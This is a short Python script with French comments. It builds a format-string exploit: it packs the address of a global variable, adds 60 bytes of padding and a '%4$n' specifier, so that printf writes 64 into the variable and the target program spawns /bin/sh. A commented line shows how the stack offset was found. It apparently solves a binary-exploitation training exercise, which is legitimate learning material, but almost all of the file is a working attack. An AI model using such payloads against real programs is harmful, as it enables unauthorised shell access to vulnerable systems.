import struct

buffer_test = 5 # Pour arriver sur le debut du buffer ou nous allons ecrire l'adresse a laquel %n va ecrire 64
buffer = 60 # Pour que le %n stock le bon nombre de caractere imprime par printf dans m (4 + buffer), car if (m == 64) {system_call(/bin/sh)}
m_address = 0x0804988c # adresse de la variable globale m

PAD = "A" * buffer

M_address = struct.pack("I", m_address) # "\x8c\x98\x04\x08"

#print "AAAA " + "| %08x " * buffer_test #test to find buffer, il commence a la 4eme adresse donc %4$n (comme %x%x%x%n)

print M_address + PAD +  "%4$n"